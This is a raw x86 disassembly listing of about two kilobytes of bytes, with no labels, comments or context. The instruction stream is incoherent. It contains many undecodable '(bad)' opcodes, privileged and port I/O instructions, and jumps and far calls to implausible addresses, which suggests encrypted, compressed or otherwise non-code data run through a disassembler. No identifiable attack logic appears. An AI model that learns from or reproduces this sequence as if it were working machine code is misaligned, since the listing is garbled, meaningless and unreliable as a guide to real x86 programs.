  42001b:	jne    0x42007a
  42001d:	sbb    DWORD PTR [ecx-0x6d53f412],0x8ea82d08
  420027:	(bad)  
  420028:	repz iret 
  42002a:	imul   ebx,ebp,0xc9c3748
  420030:	xchg   edi,eax
  420031:	imul   edi,DWORD PTR [edx],0xffffff83
  420034:	cld    
  420035:	call   0xed79a0d9
  42003a:	retf   0x2cf3
  42003d:	push   eax
  42003e:	ret    0xba89
  420041:	rol    BYTE PTR [edi],1
  420043:	jecxz  0x420080
  420045:	bound  esp,QWORD PTR [esi]
  420047:	(bad)  
  420048:	sbb    ebp,ecx
  42004a:	fstp   QWORD PTR [esp+edi*1+0x4dd02500]
  420051:	xchg   ebx,eax
  420052:	shl    BYTE PTR [eax],cl
  420054:	cmp    eax,0x2eac102f
  420059:	test   DWORD PTR [edi],edi
  42005b:	push   ebx
  42005c:	aad    0x7
  42005e:	stos   DWORD PTR es:[edi],eax
  42005f:	loope  0x42006b
  420061:	pop    eax
  420062:	das    
  420063:	mov    ds:0xf0c940be,eax
  420068:	scas   eax,DWORD PTR es:[edi]
  420069:	adc    BYTE PTR [esi+0x32107a5e],0x71
  420070:	jmp    0x42000f
  420072:	sub    al,0xb7
  420074:	imul   eax,DWORD PTR [edi-0x31],0xffffff8b
  420078:	loope  0x420006
  42007a:	jb     0x420054
  42007c:	push   ebp
  42007d:	ror    DWORD PTR [eax+0x6ed8d984],0x5a
  420084:	cld    
  420085:	inc    esi
  420086:	je     0x42001d
  420088:	cdq    
  420089:	sbb    al,0xb4
  42008b:	xor    ah,BYTE PTR [esp+ebp*1-0x77e13e8c]
  420092:	xor    dl,0x6f
  420095:	fwait
  420096:	and    BYTE PTR [esi],0x28
  420099:	and    al,0x27
  42009b:	pop    eax
  42009c:	lds    eax,FWORD PTR [ecx-0x50]
  42009f:	sbb    al,cl
  4200a1:	enter  0x858c,0x30
  4200a5:	es pop es
  4200a7:	or     BYTE PTR [ebp+eax*1+0x4d91ac18],bl
  4200ae:	cmp    al,0x7c
  4200b0:	sbb    bl,dl
  4200b2:	test   eax,0x8bdeb2bd
  4200b7:	rol    BYTE PTR [ecx-0x1d3ef861],1
  4200bd:	sub    dh,cl
  4200bf:	cmc    
  4200c0:	popf   
  4200c1:	mov    ecx,0xbf4bbbe8
  4200c6:	xchg   esi,eax
  4200c7:	shl    BYTE PTR [esi+ecx*1+0x7a2b8687],1
  4200ce:	and    esi,DWORD PTR [edx+0x36]
  4200d1:	int3   
  4200d2:	mov    BYTE PTR [ecx-0x1],dh
  4200d5:	icebp  
  4200d6:	ds xor al,cl
  4200d9:	push   ecx
  4200da:	inc    BYTE PTR [ebx+0x30]
  4200dd:	test   DWORD PTR [ebp+0x39],esp
  4200e0:	repnz hlt 
  4200e2:	inc    edx
  4200e3:	sub    al,0x5c
  4200e5:	retf   0x4edb
  4200e8:	mov    bl,0x80
  4200ea:	or     al,0xc6
  4200ec:	dec    ebx
  4200ed:	dec    edx
  4200ee:	inc    eax
  4200ef:	jb     0x4200b6
  4200f1:	shl    DWORD PTR [esi-0x70],cl
  4200f4:	and    al,BYTE PTR [edi-0x4a]
  4200f7:	push   ebx
  4200f8:	(bad)  
  4200f9:	je     0x420164
  4200fb:	mul    DWORD PTR [ebx-0xeec8683]
  420101:	xor    DWORD PTR [ecx+edi*4],edi
  420104:	and    DWORD PTR [eax-0x5e],0x243977b4
  42010b:	pusha  
  42010c:	cmp    ch,BYTE PTR [esi+0x69fb37d4]
  420112:	xchg   DWORD PTR [edi+0x1d],esp
  420115:	jecxz  0x420155
  420117:	arpl   WORD PTR [edi],sp
  420119:	mov    ch,0xaa
  42011b:	out    dx,eax
  42011c:	push   ebp
  42011d:	hlt    
  42011e:	test   al,0xde
  420120:	jg     0x4200d3
  420122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420123:	int    0xe4
  420125:	shr    DWORD PTR [edi+ebp*8+0x15],1
  420129:	push   0xc28d881c
  42012e:	test   DWORD PTR [eax-0x65d2ae37],esp
  420134:	mov    bh,0xf8
  420136:	mov    bl,0x22
  420138:	test   al,bh
  42013a:	(bad)  
  42013b:	jge    0x420122
  42013d:	push   ds
  42013e:	sub    BYTE PTR [edx],dh
  420140:	test   ebx,esi
  420142:	test   BYTE PTR [esi+0x607b1bbf],al
  420148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420149:	cli    
  42014a:	repz dec edi
  42014c:	jne    0x4201c9
  42014e:	pop    edi
  42014f:	sbb    al,0xb7
  420151:	xchg   BYTE PTR [esi+0x67889352],al
  420157:	nop
  420158:	dec    eax
  420159:	pop    ebx
  42015a:	rcl    DWORD PTR [edi-0x5e3fc855],0x3f
  420161:	jbe    0x42012f
  420163:	cmp    bh,BYTE PTR [edx-0x624ffa28]
  420169:	adc    BYTE PTR [ebp+0x6b7c9f41],bh
  42016f:	je     0x420171
  420171:	mov    ch,0xb8
  420173:	nop
  420174:	fidiv  WORD PTR [edi-0x7dc1b7a5]
  42017a:	retf   
  42017b:	pusha  
  42017c:	nop
  42017d:	pusha  
  42017e:	mov    bh,0xa1
  420180:	or     eax,0x1db03433
  420185:	rcl    ah,cl
  420187:	and    dl,0xec
  42018a:	test   DWORD PTR [esi+0x7b780e57],ecx
  420190:	add    al,0xab
  420192:	push   ds
  420193:	mov    ebp,0x9d522ba6
  420198:	loop   0x4201cf
  42019a:	and    DWORD PTR [edx],esp
  42019c:	xchg   edi,eax
  42019d:	sbb    eax,0xa8c8492c
  4201a2:	adc    al,0xee
  4201a4:	jb     0x4201cc
  4201a6:	jne    0x420144
  4201a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201a9:	out    0xeb,al
  4201ab:	cvtdq2ps xmm6,XMMWORD PTR [esi-0x47beb4ea]
  4201b2:	imul   esp,esp,0x78
  4201b5:	dec    edi
  4201b6:	push   cs
  4201b7:	and    esi,DWORD PTR [esi]
  4201b9:	or     ah,0xe1
  4201bc:	mov    cl,0x9
  4201be:	xor    esp,DWORD PTR [edi+ebx*4]
  4201c1:	iret   
  4201c2:	jp     0x420209
  4201c4:	push   esi
  4201c5:	ds jmp 0x42020a
  4201c8:	jnp    0x420218
  4201ca:	out    dx,al
  4201cb:	mov    cl,0x96
  4201cd:	loope  0x420169
  4201cf:	out    dx,al
  4201d0:	popw   ds
  4201d2:	sar    bh,0xf5
  4201d5:	out    dx,al
  4201d6:	fwait
  4201d7:	xchg   ch,dl
  4201d9:	pop    es
  4201da:	dec    eax
  4201db:	push   0xffffff86
  4201dd:	ins    BYTE PTR es:[edi],dx
  4201de:	dec    ebx
  4201df:	test   DWORD PTR [edi+0x4d],0xcf84885b
  4201e6:	xchg   ch,cl
  4201e8:	dec    ecx
  4201e9:	(bad)  
  4201ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201eb:	add    BYTE PTR ds:0xe1e8f043,bl
  4201f1:	nop
  4201f2:	xchg   ebx,esi
  4201f4:	mov    bh,0x75
  4201f6:	ss mov esp,0x90ec05cb
  4201fc:	sbb    esp,DWORD PTR gs:[eax-0xc]
  420200:	hlt    
  420201:	pop    es
  420202:	in     al,dx
  420203:	cmp    DWORD PTR [edi-0x42a869c8],ecx
  420209:	leave  
  42020a:	mov    cl,0xd3
  42020c:	adc    eax,0xfa069eed
  420211:	retf   
  420212:	xchg   esp,eax
  420213:	mov    edx,0xbcafa9d8
  420218:	mov    eax,0xed1131fb
  42021d:	repnz icebp 
  42021f:	add    BYTE PTR [esi-0x14e1ea55],ch
  420225:	(bad)  
  420226:	pusha  
  420227:	inc    eax
  420228:	adc    eax,0x21289dbd
  42022d:	out    dx,eax
  42022e:	mov    WORD PTR [eax+0x3a],?
  420231:	pushf  
  420232:	pop    es
  420233:	or     al,0x38
  420235:	icebp  
  420236:	xchg   DWORD PTR [ebx-0xea8876d],ecx
  42023c:	in     al,0xe0
  42023e:	scas   eax,DWORD PTR es:[edi]
  42023f:	inc    esi
  420240:	add    eax,esi
  420242:	pop    ss
  420243:	popa   
  420244:	mov    al,0x1e
  420246:	leave  
  420247:	test   DWORD PTR [ecx-0x68b6ad38],esp
  42024d:	mov    edi,0x89b97d5c
  420252:	jp     0x42020c
  420254:	test   eax,0x98015f82
  420259:	inc    eax
  42025a:	scas   eax,DWORD PTR es:[edi]
  42025b:	push   es
  42025c:	pop    ebx
  42025d:	js     0x420266
  42025f:	dec    eax
  420260:	dec    ebp
  420261:	mov    ebp,0xe776809b
  420266:	add    eax,0xe3b833ab
  42026b:	test   al,0xf9
  42026d:	ss fwait
  42026f:	jae    0xe6becf87
  420275:	pop    es
  420276:	mov    WORD PTR ds:0x294b221b,?
  42027c:	push   es
  42027d:	or     al,0x7e
  42027f:	out    0xa7,eax
  420281:	or     BYTE PTR [ecx],cl
  420283:	lahf   
  420284:	or     DWORD PTR [eax],0x6fe3f928
  42028a:	jg     0x42025c
  42028c:	mov    ah,dl
  42028e:	mov    edx,0xb1dbd044
  420293:	scas   al,BYTE PTR es:[edi]
  420294:	or     al,0xb9
  420296:	lds    esp,FWORD PTR [ebx]
  420298:	mov    dl,BYTE PTR [ecx-0x2]
  42029b:	xchg   esi,eax
  42029c:	push   ss
  42029d:	sub    eax,0xc2fd81a2
  4202a2:	retf   0xca9e
  4202a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202a6:	mov    bl,0x22
  4202a8:	or     al,0x7c
  4202aa:	adc    ecx,0x28444665
  4202b0:	push   ds
  4202b1:	out    dx,al
  4202b2:	pushf  
  4202b3:	pop    ebp
  4202b4:	jp     0x420256
  4202b6:	std    
  4202b7:	fs data16 aad 0x66
  4202bb:	arpl   cx,si
  4202bd:	into   
  4202be:	xor    ebp,ebx
  4202c0:	inc    ecx
  4202c1:	push   cs
  4202c2:	lods   eax,DWORD PTR ds:[esi]
  4202c3:	jecxz  0x4202e0
  4202c5:	add    eax,0xc0b3b229
  4202ca:	sbb    BYTE PTR [ecx-0xc],dl
  4202cd:	add    al,0x9
  4202cf:	je     0x420341
  4202d1:	mov    edi,0xf7bc0213
  4202d6:	push   esp
  4202d7:	ja     0x4202cc
  4202d9:	push   ebx
  4202da:	enter  0x2403,0x5e
  4202de:	icebp  
  4202df:	sub    al,0xbe
  4202e1:	(bad)  
  4202e2:	sbb    BYTE PTR [eax+ebp*8-0x6b],ch
  4202e6:	imul   ebp,DWORD PTR [ebp+0x3f],0xbe33bb35
  4202ed:	mov    ch,0xcd
  4202ef:	loope  0x420332
  4202f1:	retf   0xeaa1
  4202f4:	jecxz  0x4202ca
  4202f6:	mov    ds:0x9e076f9a,eax
  4202fb:	mov    cl,0xb7
  4202fd:	data16 jo 0x4202ce
  420300:	data16 or ch,BYTE PTR [esi+0x44]
  420304:	bound  esi,QWORD PTR [eiz*1-0x3b394587]
  42030b:	repnz test al,0xfb
  42030e:	inc    edx
  42030f:	fwait
  420310:	or     dh,dl
  420312:	(bad)  
  420313:	jb     0x420344
  420315:	dec    esp
  420316:	fldcw  WORD PTR [ebx-0x11]
  420319:	ss scas eax,DWORD PTR es:[edi]
  42031b:	adc    esp,DWORD PTR [edx+0x3b]
  42031e:	pop    ebp
  42031f:	cld    
  420320:	lods   eax,DWORD PTR ds:[esi]
  420321:	or     esi,DWORD PTR [ecx]
  420323:	add    al,0xb3
  420325:	xchg   ebx,eax
  420326:	sbb    eax,0x947cf8dd
  42032b:	cmp    edx,DWORD PTR [ebx-0x756b75f7]
  420331:	mov    dl,0xd2
  420333:	mov    ah,ah
  420335:	pop    eax
  420336:	jg     0x420349
  420338:	rcr    BYTE PTR [ecx+0x1b],1
  42033b:	cmp    BYTE PTR [esi+ebp*4],0xcb
  42033f:	or     edx,esp
  420341:	or     eax,0x23cecbd4
  420346:	bound  ebp,QWORD PTR [ecx]
  420348:	stos   DWORD PTR es:[edi],eax
  420349:	dec    esi
  42034a:	out    0x14,al
  42034c:	sub    BYTE PTR [eax+0x1d],dh
  42034f:	cli    
  420350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420351:	loop   0x42038a
  420353:	xchg   edx,eax
  420354:	cdq    
  420355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420356:	mov    ah,0x66
  420358:	add    al,0x68
  42035a:	retf   
  42035b:	mov    eax,ds:0x734b7282
  420360:	ficomp WORD PTR [ecx+0x5739bd92]
  420366:	xchg   ecx,eax
  420367:	pop    ds
  420368:	and    al,0xb8
  42036a:	dec    eax
  42036b:	mov    ebx,0x3d2a20be
  420370:	xlat   BYTE PTR ds:[ebx]
  420371:	and    esp,DWORD PTR [ebp+eiz*4+0x2c]
  420375:	shl    esp,1
  420377:	add    eax,0x34485591
  42037c:	shl    bh,cl
  42037e:	and    al,0xcd
  420380:	xchg   esi,eax
  420381:	pop    ds
  420382:	(bad)  
  420383:	lods   al,BYTE PTR ds:[esi]
  420384:	lea    eax,[ebx+0x36]
  420387:	xchg   ecx,eax
  420388:	stos   DWORD PTR es:[edi],eax
  420389:	push   ebp
  42038a:	sbb    BYTE PTR [ecx+0x678f403c],dl
  420390:	mov    fs,edx
  420392:	fiadd  DWORD PTR [esi-0x65da355e]
  420398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420399:	and    ch,BYTE PTR [edx+0x7cf55a60]
  42039f:	cmp    al,0x6d
  4203a1:	mov    ebx,0x94157b22
  4203a6:	sahf   
  4203a7:	das    
  4203a8:	dec    esp
  4203a9:	int    0xf5
  4203ab:	retw   
  4203ad:	mov    dh,0x2e
  4203af:	jno    0x4203ce
  4203b1:	dec    eax
  4203b2:	scas   al,BYTE PTR es:[edi]
  4203b3:	cmp    DWORD PTR [edi+0x4],ebx
  4203b6:	push   esi
  4203b7:	popf   
  4203b8:	inc    esp
  4203b9:	pop    ebp
  4203ba:	call   FWORD PTR [edi-0x44050229]
  4203c0:	fldenv es:[eax-0x6c0fb2e4]
  4203c7:	sbb    al,0x19
  4203c9:	dec    esp
  4203ca:	popa   
  4203cb:	out    dx,eax
  4203cc:	lds    ebx,FWORD PTR [eax+edi*1-0x4084a715]
  4203d3:	arpl   WORD PTR [eax],cx
  4203d5:	xchg   DWORD PTR [ecx],esi
  4203d7:	les    ebp,FWORD PTR [ecx-0x6f409ae0]
  4203dd:	add    ebp,DWORD PTR [ecx+eax*1+0x6a28d646]
  4203e4:	mov    dh,al
  4203e6:	push   ds
  4203e7:	test   ch,0xa5
  4203ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203eb:	dec    esi
  4203ec:	jnp    0x42041d
  4203ee:	int    0x62
  4203f0:	cwde   
  4203f1:	push   edi
  4203f2:	fwait
  4203f3:	sahf   
  4203f4:	pushf  
  4203f5:	pop    esi
  4203f6:	lahf   
  4203f7:	mov    cs,edi
  4203f9:	jg     0x420479
  4203fb:	cld    
  4203fc:	ret    0x36c
  4203ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420400:	rol    DWORD PTR [ebx-0xe],cl
  420403:	pop    es
  420404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420405:	and    esi,DWORD PTR [esi]
  420407:	lods   eax,DWORD PTR ds:[esi]
  420408:	xor    al,0xa6
  42040a:	dec    ebp
  42040b:	or     DWORD PTR [ebp+0x3e73dce],edi
  420411:	and    BYTE PTR [ecx-0x580505cd],cl
  420417:	sbb    al,BYTE PTR [esi-0x65]
  42041a:	xor    WORD PTR [edx],cx
  42041d:	ror    esp,1
  42041f:	push   ecx
  420420:	and    esp,ecx
  420422:	nop
  420423:	inc    ebx
  420424:	jno    0x420492
  420426:	dec    edx
  420427:	mov    al,0x96
  420429:	iret   
  42042a:	adc    eax,0xa4a2db99
  42042f:	dec    eax
  420430:	sub    dh,cl
  420432:	or     eax,0xfbac844a
  420437:	call   0xf9407aa7
  42043c:	scas   al,BYTE PTR es:[edi]
  42043d:	cmp    al,0xf9
  42043f:	das    
  420440:	sbb    DWORD PTR [esi],0x4db984bf
  420446:	adc    dl,BYTE PTR [edx]
  420448:	stos   DWORD PTR es:[edi],eax
  420449:	cmp    eax,0xaec9652d
  42044e:	xchg   bl,ah
  420450:	jp     0x4204b5
  420452:	jle    0x42048e
  420454:	fs push es
  420456:	(bad)  
  420457:	jge    0x4204d5
  420459:	sub    esi,esi
  42045b:	jo     0x420420
  42045d:	test   eax,0x626d4f5d
  420462:	mov    bh,bh
  420464:	fcom   QWORD PTR [ebx+0x2f]
  420467:	jbe    0x420429
  420469:	cmp    DWORD PTR [eax-0x1c],0xdb00d7b8
  420470:	mov    edx,0x7005b811
  420475:	pushf  
  420476:	and    al,BYTE PTR [eax]
  420478:	add    eax,DWORD PTR [edi-0xa90db04]
  42047e:	dec    eax
  42047f:	mov    ch,0x5
  420481:	jecxz  0x4204b0
  420483:	(bad)  
  420484:	cmp    al,0x58
  420486:	inc    eax
  420487:	pusha  
  420488:	cwde   
  420489:	(bad)  
  42048a:	outs   dx,BYTE PTR ds:[esi]
  42048b:	push   ebx
  42048c:	(bad)
  420490:	adc    al,0xd
  420492:	jno    0x4204f6
  420494:	idiv   BYTE PTR [edx+0x606a1ff5]
  42049a:	and    edi,esi
  42049c:	je     0x42047f
  42049e:	sbb    eax,0x942b69b2
  4204a3:	leave  
  4204a4:	xlat   BYTE PTR ds:[ebx]
  4204a5:	dec    esp
  4204a6:	mov    ah,0x26
  4204a8:	xor    ebp,ecx
  4204aa:	mov    WORD PTR [edi+eax*4],?
  4204ad:	and    eax,0xb30b69ba
  4204b2:	shr    DWORD PTR [edx+0x1d],cl
  4204b5:	mov    DWORD PTR [esi-0x61],esp
  4204b8:	pop    ebp
  4204b9:	or     DWORD PTR [esi-0x437c79b6],ecx
  4204bf:	cmp    dl,BYTE PTR [ecx-0x1d]
  4204c2:	jb     0x42050f
  4204c4:	out    0x6d,al
  4204c6:	sbb    dh,al
  4204c8:	sub    eax,0xbf93050b
  4204cd:	lds    esp,FWORD PTR [edi]
  4204cf:	xor    DWORD PTR [ecx],ebx
  4204d1:	mov    DWORD PTR [ecx+0x2509da00],0xaf0eb4ec
  4204db:	pop    es
  4204dc:	outs   dx,DWORD PTR ds:[esi]
  4204dd:	sbb    ebx,DWORD PTR [ecx+0x25]
  4204e0:	(bad)  
  4204e1:	jns    0x4204f6
  4204e3:	sub    dl,bh
  4204e5:	and    dh,bh
  4204e7:	in     al,0x21
  4204e9:	ror    BYTE PTR [edx-0x658f64cb],cl
  4204ef:	inc    esp
  4204f0:	fucomi st,st(4)
  4204f2:	mov    ecx,0x6adb5827
  4204f7:	lods   al,BYTE PTR ds:[esi]
  4204f8:	mov    esp,0xe1a36828
  4204fd:	fsub   QWORD PTR [ecx+0xcd0c3be]
  420503:	ss ss mov ch,0x2e
  420507:	pop    edx
  420508:	sub    eax,0x8e9578a1
  42050d:	jbe    0x42057d
  42050f:	shl    esp,cl
  420511:	fnstsw WORD PTR ds:0xd595fe11
  420517:	repnz into 
  420519:	imul   esp,DWORD PTR [ecx+0x2f8e494d],0xfffffff3
  420520:	pop    es
  420521:	and    DWORD PTR [ecx+0x6eaa0e41],edx
  420527:	pop    ebx
  420528:	add    esi,DWORD PTR [ebx+0x52]
  42052b:	mov    eax,ds:0x393a3fe3
  420530:	rcl    ebx,0x96
  420533:	in     al,dx
  420534:	add    bl,BYTE PTR [esp+ebp*8+0x29f6e057]
  42053b:	push   esp
  42053c:	add    esi,DWORD PTR [ebx-0x59]
  42053f:	pop    esi
  420540:	xor    eax,0x1d213a7c
  420545:	adc    al,0x46
  420547:	pop    edi
  420548:	sti    
  420549:	stos   DWORD PTR es:[edi],eax
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	nop
  42054c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42054d:	sbb    bh,BYTE PTR [edi-0x178650e2]
  420553:	arpl   WORD PTR gs:[edi],dx
  420556:	push   edx
  420557:	mov    esi,0xe77ec96e
  42055c:	popf   
  42055d:	ins    DWORD PTR es:[edi],dx
  42055e:	je     0x420594
  420560:	imul   esp,DWORD PTR [ebp+0x18],0xffffffaa
  420564:	stos   DWORD PTR es:[edi],eax
  420565:	repnz shl DWORD PTR [edx-0x41],cl
  420569:	fsub   DWORD PTR [si-0x4c]
  42056d:	cmp    BYTE PTR [ecx-0xe829029],ah
  420573:	xor    eax,0x98a6854f
  420578:	repz push ecx
  42057a:	ret    0xa43d
  42057d:	loopne 0x420528
  42057f:	dec    esp
  420580:	pop    esp
  420581:	out    dx,eax
  420582:	loop   0x420548
  420584:	cmp    ebx,esp
  420586:	fild   WORD PTR [edx+ebx*2]
  420589:	(bad)  
  42058a:	mov    eax,0xf46d3fd
  42058f:	add    ebx,DWORD PTR ds:0x8c63f8e3
  420595:	outs   dx,DWORD PTR ds:[esi]
  420596:	inc    edx
  420597:	in     eax,0xa2
  420599:	test   al,0x97
  42059b:	and    al,0xb2
  42059d:	pop    ebx
  42059e:	add    al,0xd4
  4205a0:	xchg   ecx,eax
  4205a1:	jmp    0x420523
  4205a3:	outs   dx,DWORD PTR ds:[esi]
  4205a4:	icebp  
  4205a5:	mov    bh,0x5e
  4205a7:	fild   QWORD PTR [edi+esi*4-0x1e9606d9]
  4205ae:	adc    DWORD PTR [edi-0x52],ecx
  4205b1:	add    ebp,DWORD PTR [edx+0x46]
  4205b4:	jbe    0x420608
  4205b6:	inc    esi
  4205b7:	push   ecx
  4205b8:	cli    
  4205b9:	xlat   BYTE PTR ds:[ebx]
  4205ba:	daa    
  4205bb:	jecxz  0x420558
  4205bd:	nop
  4205be:	mov    dl,BYTE PTR [ecx+edi*8-0x15]
  4205c2:	rol    DWORD PTR [eax+0xd],cl
  4205c5:	dec    eax
  4205c6:	pop    edi
  4205c7:	mov    cl,BYTE PTR [ecx+0x49dbac8c]
  4205cd:	jae    0x4205e5
  4205cf:	aas    
  4205d0:	cs mov al,0x36
  4205d3:	or     BYTE PTR [ebx-0x36],0x3a
  4205d7:	xchg   edx,esp
  4205d9:	cmp    eax,0xea0e3af1
  4205de:	mov    WORD PTR [ebx],es
  4205e0:	mov    ah,0xbe
  4205e2:	xor    edx,DWORD PTR [ebx]
  4205e4:	xchg   DWORD PTR [edi+0x36d557bc],ebx
  4205ea:	push   0xd2320315
  4205ef:	shld   edx,edx,cl
  4205f2:	ror    BYTE PTR [ecx-0x27a5bfca],cl
  4205f8:	pop    esi
  4205f9:	ret    0xb669
  4205fc:	aad    0xb4
  4205fe:	mov    bl,bl
  420600:	hlt    
  420601:	(bad)  
  420602:	repz dec edx
  420604:	push   edi
  420605:	fcom   DWORD PTR [eax+0x2]
  420608:	sbb    esi,DWORD PTR ds:0x42a4346c
  42060e:	fs out dx,ax
  420611:	(bad)  
  420612:	in     al,0x21
  420614:	mov    ecx,0xac3bfafa
  420619:	out    dx,al
  42061a:	xchg   esi,eax
  42061b:	pop    edi
  42061c:	outs   dx,DWORD PTR ds:[esi]
  42061d:	int3   
  42061e:	test   DWORD PTR [eax-0x2b],0x2742176e
  420625:	sbb    ch,BYTE PTR [edx+0x1c]
  420628:	fnstsw WORD PTR [ebp-0x75]
  42062b:	mov    esp,0x941f9eba
  420630:	dec    ebx
  420631:	jne    0x4205d0
  420633:	fild   QWORD PTR [ecx-0x50cf196a]
  420639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42063a:	ror    DWORD PTR [edi],0xb9
  42063d:	push   ecx
  42063e:	mov    esi,DWORD PTR [ebx+0x12]
  420641:	mov    eax,0x94f5ce66
  420646:	inc    esi
  420647:	adc    cl,BYTE PTR [esi+0x6b]
  42064a:	push   ecx
  42064b:	pmulhuw mm7,QWORD PTR [esi+0x57a8bb75]
  420652:	pop    esp
  420653:	(bad)  
  420654:	jo     0x420697
  420656:	retf   
  420657:	jecxz  0x4206b4
  420659:	loopne 0x42064e
  42065b:	mov    esi,DWORD PTR [ebx+0x814c686]
  420661:	stos   BYTE PTR es:[edi],al
  420662:	inc    eax
  420663:	enter  0xbd8d,0x60
  420667:	call   0xc8cb:0xe3c1fddf
  42066e:	mov    bl,0x71
  420670:	pop    es
  420671:	test   eax,0x7b2e6704
  420676:	mov    eax,ds:0xd77db6f9
  42067b:	push   0xb775d588
  420680:	lahf   
  420681:	or     DWORD PTR [edi-0x66],edi
  420684:	xchg   ebx,eax
  420685:	dec    eax
  420686:	push   cs
  420687:	iret   
  420688:	lods   al,BYTE PTR ds:[esi]
  420689:	test   DWORD PTR gs:[edx+0x663287ef],ebx
  420690:	pop    WORD PTR [edx-0x29]
  420694:	push   cs
  420695:	pop    DWORD PTR [edi-0x62c6e1b0]
  42069b:	fisubr DWORD PTR [esi+0x1e]
  42069e:	jmp    0xdf7316c3
  4206a3:	dec    edi
  4206a4:	push   eax
  4206a5:	js     0x420696
  4206a7:	scas   al,BYTE PTR es:[edi]
  4206a8:	adc    eax,0xf8118453
  4206ad:	xchg   ecx,eax
  4206ae:	call   0x4f9d:0xf4cf6b2b
  4206b5:	mov    eax,0x90874f8
  4206ba:	fsubp  st(4),st
  4206bc:	dec    ecx
  4206bd:	dec    esi
  4206be:	repnz retf 0xcde8
  4206c2:	mov    esi,0x3633ec4d
  4206c7:	nop
  4206c8:	cmp    BYTE PTR cs:[ebp+esi*1+0x539f6d05],bl
  4206d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206d1:	add    ebx,DWORD PTR [edx]
  4206d3:	icebp  
  4206d4:	rol    ebx,cl
  4206d6:	mov    ds:0xe6d0ad0f,al
  4206db:	aad    0x6e
  4206dd:	or     eax,0xbc0c2964
  4206e2:	or     eax,DWORD PTR [edx-0x4e]
  4206e5:	clc    
  4206e6:	cmp    al,0x83
  4206e8:	daa    
  4206e9:	ins    BYTE PTR es:[edi],dx
  4206ea:	fild   WORD PTR [ecx+0x5f1fcae9]
  4206f0:	repz jnp 0x42069e
  4206f3:	lsl    esi,WORD PTR [eax-0x27]
  4206f7:	sub    cl,BYTE PTR [eax-0x7f172c08]
  4206fd:	and    eax,0x2709fc2
  420702:	pop    ebp
  420703:	jp     0x4206bc
  420705:	xchg   ecx,eax
  420706:	cmp    DWORD PTR [ecx],ebx
  420708:	repnz push esi
  42070a:	retf   0x6ab2
  42070d:	pusha  
  42070e:	ins    BYTE PTR es:[edi],dx
  42070f:	nop
  420710:	shr    BYTE PTR [edi+0x2f],0x46
  420714:	adc    eax,0x12f80c73
  420719:	sub    BYTE PTR [eax-0x2ca2708b],dl
  42071f:	lods   eax,DWORD PTR ds:[esi]
  420720:	mov    dl,0x1d
  420722:	ret    
  420723:	out    dx,al
  420724:	(bad)  
  420725:	fsubr  DWORD PTR [edx+0x17]
  420728:	mov    ds:0xbd71a9ef,al
  42072d:	sbb    DWORD PTR [esi+0x15f9559c],ecx
  420733:	xchg   BYTE PTR [ecx-0x7ab6c802],al
  420739:	out    dx,al
  42073a:	fiadd  DWORD PTR [ebx-0x4c6f2e22]
  420740:	test   eax,0x1e7e1cda
  420745:	mov    ebp,0x7b753ea8
  42074a:	(bad)  
  42074b:	xlat   BYTE PTR ds:[ebx]
  42074c:	(bad)  
  42074d:	inc    esp
  42074e:	cmp    ecx,esp
  420750:	nop
  420751:	addr16 leave 
  420753:	mov    ds:0x711ef66e,al
  420758:	fwait
  420759:	or     DWORD PTR [eax+0x3e],edx
  42075c:	int    0xf9
  42075e:	retf   
  42075f:	mov    ebp,0x1f35f13d
  420764:	data16 (bad) 
  420766:	shl    DWORD PTR [esi],cl
  420768:	rol    DWORD PTR [ebp+0x2151a993],0x83
  42076f:	(bad)  
  420770:	jge    0x4207c2
  420772:	stos   BYTE PTR es:[edi],al
  420773:	enter  0x60f3,0xfb
  420777:	dec    esp
  420778:	stc    
  420779:	pop    ss
  42077a:	mov    dh,0x2a
  42077c:	hlt    
  42077d:	arpl   WORD PTR [ecx+ecx*4],cx
  420780:	cmp    al,0x7e
  420782:	or     DWORD PTR [ebp+0x2a],ecx
  420785:	dec    esi
  420786:	retf   
  420787:	fdiv   st,st(1)
  420789:	in     al,dx
  42078a:	hlt    
  42078b:	sub    al,0xee
  42078d:	pop    ebx
  42078e:	lahf   
  42078f:	inc    esi
  420790:	call   0x4efa29dc
  420795:	ret    
  420796:	in     eax,0xa2
  420798:	push   ss
  420799:	lock fisub DWORD PTR cs:0x10c33310
  4207a1:	cs jbe 0x42078b
  4207a4:	xchg   ebp,eax
  4207a5:	inc    esp
  4207a6:	outs   dx,DWORD PTR ds:[esi]
  4207a7:	jp     0x42077c
  4207a9:	fwait
  4207aa:	enter  0x26f1,0x5c
  4207ae:	inc    esi
  4207af:	mov    ds:0xb8475e6e,eax
  4207b4:	cld    
  4207b5:	jo     0x4207c9
  4207b7:	pop    ebx
  4207b8:	sub    bh,cl
  4207ba:	movups xmm3,XMMWORD PTR [edx]
  4207bd:	jns    0x42076f
  4207bf:	pop    ds
  4207c0:	sbb    ch,BYTE PTR [edx-0x27]
  4207c3:	scas   al,BYTE PTR es:[edi]
  4207c4:	push   es
  4207c5:	shr    DWORD PTR [esi-0x35],cl
  4207c8:	cmp    DWORD PTR [ebp-0x65],ebx
  4207cb:	adc    DWORD PTR [edi-0x1b35954b],ecx
  4207d1:	jge    0x420830
  4207d3:	adc    bl,BYTE PTR [ecx]
  4207d5:	int    0x3
  4207d7:	pop    ebp
  4207d8:	push   ebp
  4207d9:	aam    0x62
  4207db:	sub    bh,bl
  4207dd:	push   0x21
  4207df:	mov    edx,0x984966e2
  4207e4:	adc    esp,DWORD PTR [ebx-0x291677f8]
  4207ea:	retf   0x9fc3
  4207ed:	mov    eax,ds:0x930a4414
  4207f2:	test   al,0x4
  4207f4:	and    al,0x5a
  4207f6:	lds    edi,FWORD PTR [esi]
